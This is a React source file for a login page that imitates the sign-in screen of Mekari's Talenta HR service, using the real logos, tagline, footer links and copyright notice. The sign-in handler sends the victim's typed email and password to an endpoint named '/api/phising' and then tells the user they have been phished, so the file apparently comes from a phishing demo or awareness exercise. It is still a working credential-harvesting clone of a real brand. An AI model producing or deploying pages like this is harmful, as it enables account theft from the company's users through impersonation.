import React, { useState } from 'react';
import { Container, Form, Button , Image, Dropdown} from 'react-bootstrap';
import "../css/login.css"

function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

    const handleGoogleLogin = () => {
      // Tambahkan kode untuk login dengan Google di sini
      console.log('Login with Google');
    };
    
    const handleSignIn = async () => {
      try {

          const userData = {
            email: email,
            password: password
          };
    
        const response = await fetch('http://localhost:8080/api/phising', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(userData)
        });

        if (response.ok) {
          alert('Selamat anda terkena Phising!!!');
        } else {
          console.error('Gagal melakukan sign-in:', response.statusText);
          alert('Gagal melakukan sign-in');
        }
      } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan saat melakukan sign-in');
      }
    };
    
    return (
      <Container>
        <Form className='form-login'>
        <div className="logo">
        <Image height="220" src="images/Talenta-Logo.png" alt="Talenta Logo" />
      </div>
        <h2 className='sign'>Sign in</h2>
          <Form.Group className='email' controlId="formBasicEmail">
            <Form.Label>Email</Form.Label>
            <Form.Control type="email" placeholder="" value={email}
            onChange={(e) => setEmail(e.target.value)}/>
          </Form.Group>
  
          <Form.Group className='password' controlId="formBasicPassword">
            <Form.Label>Password</Form.Label>
            <Form.Control type="password" placeholder="" value={password}
            onChange={(e) => setPassword(e.target.value)}/>
          </Form.Group>
        
          <Button className='btn-login' variant="primary" type="submit" onClick={handleSignIn}>
            Sign in
          </Button>

          <div className="separator">
              <hr className="line" />
              <span className="or">atau</span>
              <hr className="line" />
          </div>

          <Button className='login-google' onClick={handleGoogleLogin} >
            <Image className='image-google' src='images/logo-google.png' alt='logo-google'/>
            Sign in with Google
          </Button>

          <div className='lain-lain'>
            <span className='lain-lainlink'>Lupa Password</span>
            <span> ∙ </span>
            <span className='lain-lainlink'>Buat akun demo</span>
          </div>
        </Form>

        <div className="footer-text">
          <span className="footer-link">Kebijakan Privasi</span>
          <span> ∙ </span>
          <span className="footer-link">Ketentuan Penggunaan</span>
          <span> ∙ </span>
          <span className="footer-link">Tentang Mekari Account</span>
          <span> ∙ </span>
       </div>

       <Dropdown className='dropdown-bahasa'>
        <Dropdown.Toggle variant="secondary" id="dropdown-basic">
          Bahasa Indonesia
        </Dropdown.Toggle>
        <Dropdown.Menu>
          <Dropdown.Item href="#/action-1">Bahasa Indonesia</Dropdown.Item>
          <Dropdown.Item href="#/action-2">English</Dropdown.Item>
        </Dropdown.Menu>
      </Dropdown>

      <div className="mekari-logo">
        <Image height="24" src="images/mekari-logo.png" alt="Mekari Logo" />
      </div>

      <div className='quetoe'>
        <h3>
        Satu akun untuk Jurnal, Klikpajak, Talenta dan Qontak
        </h3>
      </div>

      <div className='hakcipta'>
        <h3>
        © 2024 PT Mid Solusi Nusantara
        </h3>
      </div>

      </Container>
    );
  }
  
  export default Login;